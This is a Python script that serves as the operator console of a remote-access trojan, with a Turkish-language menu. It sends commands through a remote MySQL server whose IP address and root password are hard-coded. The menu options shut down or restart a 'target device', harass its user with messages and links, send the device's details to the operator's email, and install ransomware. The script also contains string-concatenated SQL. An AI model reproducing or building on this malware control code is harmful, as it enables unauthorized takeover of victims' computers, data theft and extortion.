from termcolor import colored
import mysql.connector
from tkinter import messagebox
from colorama import init, Fore, Back, Style
import os,sys,time,datetime,fade






os.system('cls' if os.name in ('nt', 'dos') else 'clear')

banner = """
                                                                        ▒
                                                                        ░█
                                                                        ███
                                                                        ██ღ█
                                                                        ██ღ▒█──────▒█
                                                                        ██ღ░▒█───────██
                                                                        █ღ░░ღ█──────█ღ▒█
                                                                    █▒ღ░▒ღ░█───██░ღღ█
                                                                    ░█ღ▒░░▒ღ░████ღღღ█
                                                            ░       █▒ღ▒░░░▒ღღღ░ღღღ██     ░█
                                                            ▓█     ░█ღ▒░░░░░░░▒░ღღ██     ▓█░
                                                             ██     █▒ღ░░░░░░░░░░ღ█    ▓▓██
                                                            ██    ██ღ▒░░░░░░░░░ღ██ ░██ღ▒█
                                                            ██ღ█  ██ღ░▒░░░░░░░░░░ღ▓██▒ღღ█
                                                            █ღღ▓██▓ღ░░░▒░░░░░░░░▒░ღღღ░░▓█
                                                            ██ღ▒▒ღღ░░ღღღღ░░▒░░░░ ღღღღ░░ღღღ██
                                                            █ღ▒ღღ█████████ღღ▒░ღ██████████ღ▒█░
                                                        ██ღღ▒████████████ღღ████████████░ღ█▒
                                                        █░ღღ████████████████████████████ღღ█
                                                        █▒ღ██████████████████████████████ღ█
                                                        ██ღღ████████████████████████████ღ██
                                                            ██ღღ██████████████████████████ღ██
                                                            ░██ღღ██████████████████████ღღ██
                                                            ▓██ღ▒██████████████████▒ღ██
                                                            ░  ░███ღ▒████████████▒ღ███
                                                            ░░   ▒██ღღ████████▒ღ██
                                                                    ▒██ღ██████ღ██
                                                                        ██ღ████ღ█
                                                                        █ღ██ღ█
                                                                        █ღღ█
                                                                        █ღ█░
                                                                        ██░                                       
"""
os.system("mode con cols=119 lines=26")
os.system('cls' if os.name in ('nt', 'dos') else 'clear')
banner1 = fade.purplepink(banner)
print(banner1)




cnx = mysql.connector.connect(user = 'root', password = 'pyzhyc-gygBic-6hobso', host='91.151.88.110', database='AliceDataBase')
cursor = cnx.cursor()


def MAİN():
    os.system('cls' if os.name in ('nt', 'dos') else 'clear')
    banner1 = fade.purplepink(banner)
    print(banner1)
    print(colored(    
"""
[1] SHUT DOWN       (Hedef Cihazı Kapatır)
[2] RESTART         (Hedef Cihazı Yeniden Başlatır)
[3] SHOW MESSAGE    (Hedef Cihaza Mesaj Gönderir)
[4] SHOW LİNK       (Hedef Cihaza Link Gönderir)
[5] YOU ARE İDİOT   (Hedef Cihazı Taciz Eder)
[6] SEND HEART<3    (Hedef Cihaza Kalp Gönderir)
[7] DEVİCE İNFO     (Hedef Cihaz Bilgilerini Gösterir)
[8] RANSOMWARE      (Hedef Cihaza Fidye Virüsü Yükler)

[0] SON GÖNDERİLEN KOMUTU SİLER      

                """, "green"))
    COMMAND = input("---> ")

    while True: 
            if COMMAND == "1":
                try:
                            cursor = cnx.cursor()
                            cursor.execute("SELECT askupdate, message FROM updater")
                            data = cursor.fetchone()
                            
          
                            sql1 = "UPDATE updater SET askupdate ='KAPAT'"
                            cursor.execute(sql1)
                            cnx.commit()


                            print(colored("[+] Hedef Cihaz Kapatıldı.","green"))
                            time.sleep(3)
                            MAİN()
                        
                except:
                            print(colored("Bir Hata Oluştu.","red"))
                            time.sleep(3)
                            MAİN()

      
            if COMMAND == "2":
                try:
                            cursor = cnx.cursor()
                            cursor.execute("SELECT askupdate, message FROM updater")
                            data = cursor.fetchone()
                                            
                            sql1 = "UPDATE updater SET askupdate ='YENİDEN'"
                            cursor.execute(sql1)
                            cnx.commit()


                            print(colored("[+] Hedef Cihaz Kapatıldı.","green"))
                            time.sleep(3)
                            MAİN()
                        
                except:
                            print(colored("Bir Hata Oluştu.","red"))
                            time.sleep(3)
                            MAİN()


            if COMMAND == "3":
                    try:
                                cursor = cnx.cursor()
                                cursor.execute("SELECT askupdate, message FROM updater")
                                data = cursor.fetchone()
                                    
                                mesaj=input("Mesajın: ")

                                    
                                sql1 = "UPDATE updater SET askupdate ='MESAJ'"
                                sql2 = "UPDATE updater SET message ='"+mesaj+"'"
                                cursor.execute(sql1)
                                cursor.execute(sql2)
                                cnx.commit()



                                print(colored("[+] Hedef Mesaj Gönderildi.","green"))
                                time.sleep(3)
                                MAİN()
                            
                    except:
                                print(colored("Bir Hata Oluştu.","red"))
                                time.sleep(3)
                                MAİN()


            if COMMAND == "4":
                try:
                            cursor = cnx.cursor()
                            cursor.execute("SELECT askupdate, message FROM updater")
                            data = cursor.fetchone()
                                
                            mesaj=input("Link: ")

                                
                            sql1 = "UPDATE updater SET askupdate ='LİNK'"
                            sql2 = "UPDATE updater SET message ='"+mesaj+"'"
                            cursor.execute(sql1)
                            cursor.execute(sql2)
                            cnx.commit()


                            print(colored("[+] Hedef Cihaza Link Gönderildi.","green"))
                            time.sleep(3)
                            MAİN()
                        
                except:
                            print(colored("Bir Hata Oluştu.","red"))
                            time.sleep(3)
                            MAİN()


            if COMMAND == "5":
                print(colored("Eminmisin? Bu Çok Ağır Bir Saldırı!","red"))
                emins = input("y/n: ")
                if "y" in emins or "Y" in emins:
                    try:
                                cursor = cnx.cursor()
                                cursor.execute("SELECT askupdate, message FROM updater")
                                data = cursor.fetchone()
                                    
                                mesaj=input("Mesajın: ")

                                    
                                sql1 = "UPDATE updater SET askupdate ='İDİOT'"
                                sql2 = "UPDATE updater SET message ='"+mesaj+"'"
                                cursor.execute(sql1)
                                cursor.execute(sql2)
                                cnx.commit()


                                print(colored("[+] Hedef Cihaz Taciz Edildi.","green"))
                                time.sleep(3)
                                MAİN()
                            
                    except:
                                print(colored("Bir Hata Oluştu.","red"))
                                time.sleep(3)
                                MAİN()
                else:
                    print(colored("Hedef Cihazınızın Taciz Edilmesi İptal Edildi.","green"))
                    time.sleep(3)
                    MAİN()


            if COMMAND == "6":
                    try:
                                cursor = cnx.cursor()
                                cursor.execute("SELECT askupdate, message FROM updater")
                                data = cursor.fetchone()
                                    
                                mesaj=input("Mesajın: ")

                                sql1 = "UPDATE updater SET askupdate ='KALP'"
                                sql2 = "UPDATE updater SET message ='"+mesaj+"'"
                                cursor.execute(sql1)
                                cursor.execute(sql2)
                                cnx.commit()

                                print(colored("[+] Hedef Cihaza Kalp Gönderildi.","green"))
                                time.sleep(3)
                                MAİN()
                            
                    except:
                                print(colored("Bir Hata Oluştu.","red"))
                                time.sleep(3)
                                MAİN()


            if COMMAND == "7":
                        try:
                                cursor = cnx.cursor()
                                cursor.execute("SELECT askupdate, message FROM updater")
                                data = cursor.fetchone()
                                    
                                sql1 = "UPDATE updater SET askupdate ='PCİNFO'"
                                cursor.execute(sql1)
                                cnx.commit()

                                print(colored("[+] Hedef Cihaz Bilgileri E-postana Gönderildi.","green"))
                                time.sleep(3)
                                MAİN()
                            
                        except:
                                print(colored("Bir Hata Oluştu.","red"))
                                time.sleep(3)
                                MAİN()


            if COMMAND == "8":
                        print(colored("UYARI! Bu İşlem Hedef Cihazdaki Bir Çok Şeyi Devre Dışı Bırakabilir!","red"))
                        try:
                                cursor = cnx.cursor()
                                cursor.execute("SELECT askupdate, message FROM updater")
                                data = cursor.fetchone()
                                    
                                sql1 = "UPDATE updater SET askupdate ='RANSOMWARE'"
                                cursor.execute(sql1)
                                cnx.commit()

                                print(colored("[+] Hedef Cihaza Fidye Uygulaması Sızdı.","green"))
                                time.sleep(3)
                                MAİN()
                            
                        except:
                                print(colored("Bir Hata Oluştu.","red"))
                                time.sleep(3)
                                MAİN()
 
 

            
            
            
            
            if COMMAND == "0":
                        try:
                                cursor = cnx.cursor()
                                cursor.execute("SELECT askupdate, message FROM updater")
                                data = cursor.fetchone()
                                    
                                sql1 = "UPDATE updater SET askupdate ='NONE'"
                                cursor.execute(sql1)
                                cnx.commit()

                                print(colored("[+] Son Gönderilen Komut Silindi.","green"))
                                time.sleep(3)
                                MAİN()
                            
                        except:
                                print(colored("Bir Hata Oluştu.","red"))
                                time.sleep(3)
                                MAİN()
                          

            welcome = Fore.RED + "You Are Redirected To The Menu...\n"
            for char in welcome:
                    sys.stdout.write(char)
                    sys.stdout.flush()
                    time.sleep(0.03)
            MAİN()



        

MAİN()